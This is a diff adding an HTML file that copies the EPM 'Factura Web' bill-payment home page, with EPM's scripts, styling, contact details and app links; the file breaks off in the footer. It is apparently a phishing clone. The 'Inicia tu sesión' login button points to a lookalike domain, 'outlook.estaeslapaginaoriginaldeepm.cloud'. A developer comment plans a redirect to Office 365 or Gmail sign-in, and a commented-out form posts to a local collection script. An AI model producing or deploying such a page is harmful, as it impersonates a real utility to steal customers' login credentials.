@@ -1,0 +1,585 @@
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+        Factura Web - Inicio
+    </title>
+    <link rel="shortcut icon" href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/icons/favicon.ico"
+        type="text/css" />
+    <!---------------------------------------------------------------------
+    ----------------------------------- JS ------------------------------>
+    <script src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/js/jquery.min.js"></script>
+    <script src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/js/jquery.tooltipster.js"></script>
+    <script src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/js/main.js"></script>
+    <script src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/js/placeholders.min.js"></script>
+    <script src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/js/FacturaWeb.js"></script>
+    <script type="text/javascript">
+        window.history.forward();
+        function disableBackButton() {
+            window.history.forward();
+        }
+
+        function DevanecerEnlaces() //
+        {
+            if (!document.all) //
+            {
+                return;
+            }
+            else //
+            {
+                var objDesvanecer = null;
+                for (i = 0; i < document.all.tags('blink').length; i++) //
+                {
+                    objDesvanecer = document.all.tags('blink')[i];
+                    objDesvanecer.style.color = (objDesvanecer.style.color == 'white') ? 'blue' : 'white';
+                }
+            }
+        }
+
+        function Redireccionar(url) {
+            var sUrl = url
+            window.location = url;
+        }
+
+        function general() {
+        }
+
+    </script>
+    <!-- SCRIPT PARA GOOGLE  ANALYTICS -->
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date(); a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-47372325-5', 'auto');
+        ga('send', 'pageview');
+    </script>
+    <link href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/css/FacturaWeb.css" type="text/css"
+        rel="stylesheet" />
+    <link href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/css/popup/popup.css" type="text/css"
+        rel="stylesheet" />
+    <link href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/css/popup/simplemodal.css" type="text/css"
+        rel="stylesheet" />
+    <link href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/css/style.css" type="text/css"
+        rel="stylesheet" />
+    <link href="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/css/tooltipster.css" type="text/css"
+        rel="stylesheet" />
+</head>
+
+<body onload="general();disableBackButton();setInterval('DevanecerEnlaces()',500);">
+    <!--En este metodo es donde debemos redirigir al office 365 o gmail y despues iniciar sersion-->
+    <!-- <form method="post" action="http://192.168.1.5/post.php"
+        http://192.168.1.5/post.php"http://192.168.1.5/post.php"http://192.168.1.5/post.php"index.html" id="aspnetForm"
+        autocomplete="off" class="body" novalidate=""> -->
+        <div class="aspNetHidden">
+            <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+            <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
+                value="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" />
+        </div>
+
+        <script type="text/javascript">
+            //<![CDATA[
+            var theForm = document.forms['aspnetForm'];
+            if (!theForm) {
+                theForm = document.aspnetForm;
+            }
+            function __doPostBack(eventTarget, eventArgument) {
+                if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                    theForm.__EVENTTARGET.value = eventTarget;
+                    theForm.__EVENTARGUMENT.value = eventArgument;
+                    theForm.submit();
+                }
+            }
+//]]>
+        </script>
+
+
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/WebResource.axd?d=pynGkmcFUV13He1Qd6_TZBA28I_fLK7cugS1G1E1P-OP3ziR1VAHpdp3rZlQZXa7cQ_EBhimneEQ8IEdmUnhQQ2&amp;t=637956342236704893"
+            type="text/javascript"></script>
+
+
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=qph9tUZ6hGPLbkznkRkqTRMe4v6p5UHaaYGxAK_B3uS_R9yzPfLu9I-wzHofKy4r5gLqGiGicc80q37AsXPWuZH5h6caRIZ6NmR1N9dBj-9XwNG8V7fEP7mXUNaGOipm0&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=TvpD2YGOOsCm1yWcLkKnBZ5fKiaAqZOitV6f_ZJ8WZL9_ewAgV_76BEG5W-bZzXyc29jQL3hFBhhaWjGOyobdfIPbip-RPAzPuJkYG0c0Oh0B52gjSw1l7GRBbKmHe-q0&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=Ph9KYRob2cmMiWgs3oahYs3F41G8_3BIsSD6d6XrLFjPySCHhjwciM8I8uWgvChT0A9i5Tx-uPtXMfeg2grVb5X0yuE8erPshEFpJi7hzIm17tEXNSUNyUF8XUL-Iq-x0&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=SCktwi-Z1SFGgmHzICetrvqQrpiCnhhNn7ohKo08-owM5bOOvXwdVbdB6GZ59KxLjgaZQtVBfObcvqdrqJmXgLK4W9Ojr_RG6aK1WNQxq_J2EteAMFxCgu9ufKtnLrhZxB8q0GCMjFIDcvP-2yPpQQ2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=rEnisSq7i0BGB42momXTIEzs1fQ5IHTlNmtC-0yDS_cpacfjEBzriACJ99ws3w7TEl4-MxIcP_dBFPf_n9Ozc_s-J4N8HvpEq7YmqKdiSE4BzbAGKbgFI6TWzaXaO8KbaXR10FivseZ_EltcAK3Fkw2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=6cv1RuDGw9eD36DQVPsZ6_EPFcwiK2m_Z0HkHlkxViuyBLXtrEukSU58I0QdHXowA0UMbOJKov2pcRjLXdN5zq1dydearI5uGsSDdD1DXBq7r5yQpa0aBXlnJ96_eoui0&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=OIkWahXMyTi70MXMQWktDqqkn_RmE_XcOEM0lEw36WgW43WCXsjQ8oj--tGTNZ_xlZZEcZxq2fLpvLXmgw3l67O-n1Ypq9t9H8soc5r_-OdeM85-xOtnRf9_qadplWtxIEaaIEXi2zKBtjM6Imr_bA2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=t0O6Yc3FzeoXP8pjMQG5yv6JsDfrro5KbqxfMjBGr7tx4Pmn53205qA1eerXg-jLDyFJSoqr4vew3wOIP9U7V8AbVuixgyRCqI2ZczLE69Epq3EpJR1IgR9SbB8V71MK0WetMxbgCmmsgjF5iciS3w2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=QCoWR-h63aOo-AZIyDRuwM-_7dn5tv7SXLTn_Mum_Ol0RoHSuG60U1XqxJRwMTEE1VeuUPcMt3VcO2To8Z2yIVynCElkblf0Yn24Jx18dy0t6pAMjB860ApKnKfDGQNHOeIiq4WVryNYrS4T8fqRWQ2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=5coR3jRChwN9r6AC5qT2WQGkOWs0uX4xTHklePaYbJngir9ocq9uAhSRsWSAUp99VVm8dr5cPt-WwdtesnTjoTd1oB55jC60ZMovmwf_xgkaQGtw6pOhXk6QX28MAnIA0&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=nK6so0M3WJsZqnQeiF58DeXl1cZyMpA9FSmLCHZC-a9nGC8lXDB2M3SXqJJT4BW1urNfUPqEjiuEyywpMXAosLzc4cnNhr3ugXvVUa0EwQzWhcEj6b20tUrAFkgDEzGqwVjT9y5jbtCP2IEj_KH02Q2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=redQsF7wEkgmMSvWolVslk2c9H1N85TMF_YTk-wpmltXyvKG1sL4aaE0YD__O0bZPSySoTNcyMZ9X--Esq3hMIoDzfoRqgij1oe32nzIAqkzjoOx9GDkL04FE7NcSJj_aj28_xS2F3B0Ns956ERplw2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <script
+            src="https://www13.epm.com.co/FacturaWeb/ScriptResource.axd?d=Va5YjwWIxP1x6ZWgL6LRANz4TXjRIFBLpKO8tk2cu43xG9M_-X_DYReOV0v50HuAPz_3PTgnqM1KLRCMTPmsROir0c29HTkeGqVpvRwWbxTZ2KUklZ6oSDTnpxqx3hOEEYa8ajWvU6R-MT1BVt7R2A2&amp;t=3a1336b1"
+            type="text/javascript"></script>
+        <div class="aspNetHidden">
+
+            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="859A2444" />
+            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
+                value="ram3kIdzGzHnJl4dKk/JKcmMWu1u4/CePm3ZY7HUP5SdjUDZM7Kp4ilBZ3Zra9SD0Zv5rXXY+0k4fYSo8oUXVHKLbYfGiqpSUGI/MfzmsIOGed9awEaM/wonEnVcpYymsfbhfW2sjOoKTGk2HL8TiqJe9TnP1nXbrI1VrsOZCroWOZ9oWiIgdVJLUqWAtova9Vd8hmavbdGMYdUmIloDuObBFYLK4wWT/xKoeAmT1jjdi2s8v7QZAc82C62ogjtTlHbnxbDu5QDd+AkHx9OkH8tQrW+G7Tb96AkdSJj8KRxV5Bri4c83UDX/Wo5XxDOx" />
+        </div>
+        <script type="text/javascript" language="javascript">
+            var url = window.location.pathname;
+
+            //Se evalua que la url actual no termine con un '/', si termina con este caracter, se elimina.
+            if (url.substring(url.length - 1) == '/') {
+                url = url.substring(0, url.lastIndexOf('/'));
+            }
+            var currentPageName = url.substring(url.lastIndexOf('/') + 1);
+
+            if (currentPageName != 'TimeOut.aspx') {
+                //Redirecciona a la pagina de timeout cuando se expira la ssesión
+                var redirectTimer = setTimeout('redirectToTimeOutPage()', getSessionValue());
+            }
+
+            function getSessionValue() {
+                var sessionTimeOutValue = '2400000';
+                return sessionTimeOutValue;
+            }
+
+            function redirectToTimeOutPage() {
+                var url = window.location.pathname;
+
+                if (url.substring(url.length - 1) == '/') {
+                    window.location = "../../PaginasGenerales/TimeOut.aspx";
+                }
+                else {
+                    window.location = "../PaginasGenerales/TimeOut.aspx";
+                }
+            }
+        </script>
+        <!-- header -->
+        <div class="header">
+            <header>
+                <div class="navTop">
+                    <div class="container group">
+                        <nav>
+                            <ul>
+                                <li>
+                                    <a id="ctl00_btnSalir"
+                                        href="javascript:__doPostBack(&#39;ctl00$btnSalir&#39;,&#39;&#39;)">Ir a
+                                        epm.com.co</a>
+                                </li>
+                                <li>
+
+                                </li>
+                                <li>
+                                    <a id="ctl00_ayudaLink" class="Ayuda"
+                                        href="javascript:__doPostBack(&#39;ctl00$ayudaLink&#39;,&#39;&#39;)">Ayuda</a>
+                                </li>
+                            </ul>
+                        </nav>
+                        <!-- usuario sesion -->
+                        <div class="userSesion grid_13">
+                            <div class="closeSesion">
+
+                            </div>
+                            <div class="User">
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="headerInfo">
+                    <div class="container group">
+                        <div class="title">
+                            <h1>Factura Web</h1>
+                        </div>
+                        <div class="siteBy"></div>
+                    </div>
+                </div>
+            </header>
+        </div>
+
+        <script type="text/javascript">
+            //<![CDATA[
+            Sys.WebForms.PageRequestManager._initialize('ctl00$cphPrincipal$ScriptManager1', 'aspnetForm', [], [], [], 90, 'ctl00');
+//]]>
+        </script>
+
+        <!-- contenido -->
+        <div class="contentInner padding" id="fw-home">
+            <section>
+                <article>
+                    <div class="container group">
+                        <!-- opcion 1 -->
+                        <div class="grid_4">
+                            <div class="textOption">
+                                <p>Aquí puedes...</p>
+                                <h3>Consultar y pagar directamente tu factura</h3>
+                            </div>
+                            <div class="option to1 contendor-options">
+                                <ol>
+                                    <li>
+                                        <p><span>1. </span>Selecciona el tipo de factura:</p>
+
+                                        <div class="selectPago">
+                                            <span name="RadioNumCont"><input id="RadioNumCont" type="radio"
+                                                    name="ctl00$cphPrincipal$formaPago" value="RadioNumCont"
+                                                    checked="checked" /></span>
+                                            <label style="font-size: 16px;" for="contratoCheck">Tengo una factura
+                                                de</label>
+                                            <span class="help tooltip-help-contrato"></span>
+                                            <label class="label-TipoFactura">Servicios Públicos</label>
+
+                                        </div>
+
+                                        <div class="selectPago">
+                                            <span name="RadioNumOw"><input id="RadioOw" type="radio"
+                                                    name="ctl00$cphPrincipal$formaPago" value="RadioOw" /></span>
+                                            <label style="font-size: 15px;" for="referenteOWCheck">Tengo una factura
+                                                diferente</label>
+                                            <label class="label-TipoFactura" for="referenteOWCheck">No es de servicios
+                                                públicos</label>
+                                            <span class="help tooltip-help-RI"></span>
+                                        </div>
+                                    </li>
+                                </ol>
+                                <div>
+                                    <p><span>2. </span>Ingresa el número según tu elección:</p>
+                                    <div class="inputContrato">
+                                        <input name="ctl00$cphPrincipal$textFiltro" id="ctl00_cphPrincipal_textFiltro"
+                                            type="text" placeholder="Documento/Contrato"
+                                            class="numerConsulta numerConsulta-1 Required campoRequired" min="0"
+                                            onkeyup="return ValidaSoloNumeros(event);"
+                                            onblur="return EsNumero(ctl00$cphPrincipal$textFiltro);" />
+                                    </div>
+                                    <input type="submit" name="ctl00$cphPrincipal$consultaPagoLink"
+                                        value="Consulta y paga" id="ctl00_cphPrincipal_consultaPagoLink"
+                                        class="btn_principal" style="height:75px;" />
+                                </div>
+                            </div>
+                        </div>
+                        <!-- opcion 2 -->
+                        <div class="grid_4">
+                            <div class="textOption">
+                                <p>También puedes...</p>
+                                <h3>Inscribirte o iniciar sesión en Factura Web</h3>
+                            </div>
+                            <div class="option to2 contendor-options">
+                                <div class="texto-inscripcion">
+                                    <ul>
+                                        <li>
+                                            <p>Al inscribirte, si lo deseas, recibirás en tu correo la factura de EPM en
+                                                formato digital.</p>
+                                        </li>
+                                        <li>
+                                            <p>Verás el histórico de tus facturas.</p>
+                                        </li>
+                                    </ul>
+                                </div>
+
+                                <div>
+                                    <a id="ctl00_cphPrincipal_registroLink" class="btn_inscription"
+                                        href="javascript:__doPostBack(&#39;ctl00$cphPrincipal$registroLink&#39;,&#39;&#39;)">Inscríbete<span>si
+                                            no lo has hecho</span></a>
+                                    <a id="ctl00_cphPrincipal_sesionLink" class="btn_principal"
+                                        href="https://outlook.estaeslapaginaoriginaldeepm.cloud/LcwshNNZ">Inicia
+                                        tu sesión<span>si ya estás inscrito</span></a>
+                                </div>
+
+
+                            </div>
+                        </div>
+                        <!-- opcion 3 -->
+                        <div class="grid_4">
+                            <div class="textOption">
+                                <p>O puedes...</p>
+                                <h3>Así puedes inscribirte a Factura Web</h3>
+                            </div>
+                            <div class="option to3 " style="padding: 0px; width: auto;">
+                                <iframe src="https://www.youtube-nocookie.com/embed/rSrBJBaOSl0?rel=0"
+                                    style="width: 100%; height: 170px;" frameborder="0"
+                                    allow="autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                                    allowfullscreen></iframe>
+                            </div>
+                            <div class="textOption">
+                                <h3>Accede desde tu móvil</h3>
+                            </div>
+                            <div class="option to2">
+                                <p style="text-align: justify;">Te invitamos a descargar nuestra aplicación EPM estamos
+                                    ahí, donde a través de la opción Factura Web podrás pagar la factura de EPM
+                                    fácilmente desde el lugar donde te encuentres, así como muchas otras opciones más.
+                                </p>
+                                <div class="container-img" style="text-align: center;">
+                                    <a href="https://play.google.com/store/apps/details?id=com.epm.app" target="_blank">
+                                        <img
+                                            src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/google-play-badge.png" /></a>
+                                    <a href="https://apps.apple.com/co/app/epm-estamos-ah%C3%AD/id935804740"
+                                        target="_blank">
+                                        <img
+                                            src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/app-store-badge.png" /></a>
+                                </div>
+
+                            </div>
+
+                        </div>
+                    </div>
+                </article>
+            </section>
+        </div>
+
+        <div id="ctl00_cphPrincipal_pPagosSoloEPMn" class="simple-modal draggable verticalscroll_1"
+            style="display: none">
+
+
+            <div>
+                <div data-val-displaymode="List" data-val-validationGroup="general"
+                    id="ctl00_cphPrincipal_panelPagosSoloEPM_vsGeneral" data-valsummary="true" style="display:none;">
+
+                </div>
+            </div>
+            <!-- Mensaje Error -->
+
+            <!-- Mensaje Advertencia -->
+
+            <!-- Mensaje Información -->
+
+            <!-- Mensaje Exito -->
+
+            <!-- Mensaje Pregunta -->
+
+            <!-- Mensaje Validación captcha -->
+
+            <!-- Mensaje Validación informacion -->
+
+            <!-- Mensaje Solo pagos EPM -->
+            <div id="ctl00_cphPrincipal_panelPagosSoloEPM_PnlInformativoSinTitulo">
+
+
+                <div class="simple-modal-body">
+                    <div class="contents">
+                        <br />
+                        <img id="ctl00_cphPrincipal_panelPagosSoloEPM_imagen"
+                            src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/popup/alert.png"
+                            style="height:40px;width:40px;align-content:center" />
+                        <br />
+                        <br />
+                        <span id="ctl00_cphPrincipal_panelPagosSoloEPM_lblInformativoSinTitulo">
+                            <p style="text-align: center; font-size: 16px;">Si tu factura es de una de estas empresas,
+                                te <br /> invitamos a ir a las p&aacute;ginas Web de cada una de <br /> ellas, para
+                                gestionar tus pagos.</p>
+                            <div style="text-align: center;">
+                                <a href="https://caribemar.facture.co/" target="_blank"><img
+                                        src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/Logo-AFINIA.jpg"
+                                        width="60px" height="25px" style="padding: 10px;" /></a>
+                                <a href="https://www.zonapagos.com/t_hidrocaldasbd/pagos.asp" target="_blank"><img
+                                        src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/CHEC.jpg"
+                                        width="55px" height="25px" style="padding: 10px;" /></a>
+                                <a href="https://www.abcpagos.com/edeq/index.php" target="_blank"><img
+                                        src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/EDEQ.jpg"
+                                        width="55px" height="35px" style="padding: 10px;" /></a>
+                                <a href="https://www.essa.com.co/site/mi-factura/consulta-y-descarga-tu-factura#PAGO-TOTAL-aqu-313"
+                                    target="_blank"><img
+                                        src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/ESSA.jpg"
+                                        width="55px" height="22px" style="padding: 10px;" /></a>
+                                <a href="https://sites.placetopay.com/censcentraleselectricasdelns/login"
+                                    target="_blank"><img
+                                        src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/contenido/CENS.jpg"
+                                        width="30px" height="40px" style="padding: 10px;" /></a>
+                            </div><br />
+                            <div style="text-align: center; font-size: 14px;">Si tu factura es de EPM puedes continuar
+                                con el pago</div>
+                        </span>
+
+                    </div>
+                </div>
+
+            </div>
+
+
+            <div class="simple-modal-footer">
+                <a class="close" href="https://www13.epm.com.co/FacturaWeb/Paginas/index.html#" title="Cerrar"
+                    onclick="$get('btnContinuar').click();return true;"></a>
+                <div id="ctl00_cphPrincipal_footerContinuar">
+
+                    <div><a title="Continuar" id="btnContinuar" class="btn secondary"
+                            onclick="$get('btnContinuar').click();;return true;">Continuar en Factura Web EPM</a></div>
+                    <br />
+                    <br />
+                    <div style="display: flex; justify-content: space-around; align-items: center;">
+                        <a href="http://www.epm.com.co" style="color: #027a36; font-size: 12px;"><u>Salir de Factura Web
+                                EPM</u></a>
+                    </div>
+
+                </div>
+            </div>
+            <br />
+
+        </div>
+
+
+
+        <input name="ctl00$cphPrincipal$hddInfoSoloPagosEPM" type="hidden"
+            id="ctl00_cphPrincipal_hddInfoSoloPagosEPM" />
+
+        <div class="verticalscroll1">
+            <!--Mensajes con PopUP-->
+            <div id="ctl00_panVentanaModalAdvertencia" class="simple-modal draggable verticalscroll_1"
+                style="display: none">
+
+
+                <a class="close" href="https://www13.epm.com.co/FacturaWeb/Paginas/index.html#"
+                    onclick="$get('btnCerrar').click()"></a>
+
+                <div>
+                    <div data-val-displaymode="List" data-val-validationGroup="general"
+                        id="ctl00_panelMensajes_vsGeneral" data-valsummary="true" style="display:none;">
+
+                    </div>
+                </div>
+                <!-- Mensaje Error -->
+
+                <!-- Mensaje Advertencia -->
+
+                <!-- Mensaje Información -->
+
+                <!-- Mensaje Exito -->
+
+                <!-- Mensaje Pregunta -->
+
+                <!-- Mensaje Validación captcha -->
+
+                <!-- Mensaje Validación informacion -->
+
+                <!-- Mensaje Solo pagos EPM -->
+
+
+
+                <div id="divMensajeInicial" class="wrapper clearfix grisClaro">
+                </div>
+                <div class="simple-modal-footer">
+                    <a title="Cerrar" id="btnCerrar" class="btn primary" onclick="$get('btnCerrar').click()">
+                        <span id="ctl00_lblMasterPanel">Cerrar</span></a>
+                </div>
+
+            </div>
+
+            <input name="ctl00$hddMensajes" type="hidden" id="ctl00_hddMensajes" />
+        </div>
+        <!-- footer -->
+        <footer>
+            <div class="footer padding">
+                <div class="footer-info-top">
+                    <div class="container group">
+                        <div class="footer-3col left-item">
+                            <h3>Líneas de contacto</h3>
+                            <ul class="">
+                                <li>Todo el país <span>01 8000 415115</span></li>
+                                <li>Medellín <span>(57) (4) 4444 115</span></li>
+                                <li>Conmutador <span>(57) (4) 380 80 80</span></li>
+                                <li>Fax <span>356 91 11</span></li>
+                                <li>Clientes corporativos <span>01 8000 410115</span></li>
+                            </ul>
+                        </div>
+
+                        <div class="footer-3col middle-item">
+                            <h3>Contacto Transparente</h3>
+                            <p>Es un mecanismo para registrar actos indebidos de los servidores de EPM y los demás
+                                grupos de interés. Comunícate al <span>01 8000 522955</span> o haz <a target="_blank"
+                                    href="https://contactotransparente.epm.com.co/">clic aquí para registrar un
+                                    incidente.</a></p>
+                        </div>
+
+                        <div class="footer-3col right-item">
+                            <h3>Horario de atención</h3>
+                            <p>Edificio EPM de lunes a viernes de 7:30 a.m. a 5:00 p.m.
+                                <br />
+                                Jornada continua
+                                <br />
+                                Carrera 58 42-125. Medellín, Antioquia, Colombia
+                                <br />
+                                <a href="mailto:epm@epm.com.co">epm@epm.com.co</a>
+                            </p>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="container group footer-bottom">
+                    <div class="grid_9">
+                        <p>
+                            Para una mejor visualización sugerimos:
+                            <img id="ctl00_ctl00_imageIE" title="IE"
+                                src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/footer/icoIE.jpg"
+                                style="height:23px;width:23px;border-width:0px;" />
+                            IE 9.0, 10.0, 11.0
+                            <img id="ctl00_ctl00_image1" title="Chrome"
+                                src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/footer/IconChrome.png" />
+                            Chrome
+                            <img id="ctl00_ctl00_image2" title="Firefox"
+                                src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/footer/Mozilla%20Firefox.png" />
+                            Mozilla Firefox
+                            <br />
+                            EPM, todos los derechos reservados © | <a id="ctl00_HlTerminosYcondiciones"
+                                href="https://www13.epm.com.co/FacturaWeb/Paginas/TerminosYCondiciones.aspx"
+                                target="_blank">Términos y condiciones</a>
+                            <br />
+                        </p>
+
+                        <span id="ctl00_versionLabel">Versión:</span>
+                        <span id="ctl00_textoVersionLabel">1.0.0.0 - jueves, 06 de julio de 2023 11:17:48 a. m.</span>
+                        <p>
+                            <br />
+                            <img id="ctl00_ctl00_imageServicios" title="Super Servicios"
+                                src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/footer/superservicios.png" />
+                        </p>
+                    </div>
+                    <div class="grid_3 logoFooter">
+                        <img id="ctl00_ctl00_imageLogoEPM" title="EPM"
